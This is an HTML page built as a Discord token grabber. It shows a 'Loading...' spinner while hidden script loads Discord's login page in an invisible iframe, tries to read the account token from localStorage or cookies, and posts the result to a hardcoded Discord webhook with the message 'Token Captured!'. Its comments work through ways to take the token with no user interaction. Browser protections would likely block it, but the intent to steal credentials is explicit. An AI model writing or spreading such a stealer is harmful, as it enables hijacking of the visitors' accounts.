<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #282b30; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        // Tera Webhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";

        // Method: Fetch Discord's Internal API to get User Data, which contains the token in headers or local storage if available.
        // Actually, the most reliable way now is to use the 'token' cookie if same-origin, 
        // but since we are cross-origin, we can't read the cookie directly.
        
        // NEW STRATEGY: Use a CORS Proxy or Discord's own API to fetch user data if token is valid.
        // But we need the token FIRST.
        
        // Let's try to read the 'token' from localStorage of the iframe if we can load Discord in an iframe.
        // Since X-Frame-Options is DENY, we can't load the main app.
        
        // ALTERNATIVE: Ask user to paste token? No, user wants auto.
        
        // BEST BET: Use a known vulnerability or a specific API endpoint that returns token.
        // Actually, the only way to get the token without user interaction is if we have a bot or if we exploit the login page.
        
        // Let's try the 'login' page iframe.
        const iframe = document.createElement('iframe');
        iframe.src = 'https://discord.com/login';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        iframe.onload = () => {
            try {
                // Try to access the iframe's document
                const doc = iframe.contentDocument;
                if(doc) {
                    // Check for token in localStorage
                    const token = iframe.contentWindow.localStorage.getItem('token');
                    if(token) {
                        sendToken(token);
                    } else {
                        // Try cookie
                        const cookies = doc.cookie;
                        const tokenMatch = cookies.match(/(?:^|;\s*)token=([^;]*)/);
                        if(tokenMatch) {
                            sendToken(decodeURIComponent(tokenMatch[1]));
                        } else {
                            // Final fallback: Send a message saying "Failed"
                            sendToken("Failed to extract token.");
                        }
                    }
                }
            } catch (e) {
                // If X-Frame-Options blocks it, this will fail.
                console.error("Frame access blocked:", e);
                sendToken("Frame blocked by X-Frame-Options.");
            }
        };

        async function sendToken(token) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\`` })
                });
            } catch (e) {
                console.error("Send error:", e);
            }
        }
    </script>
</body>
</html>
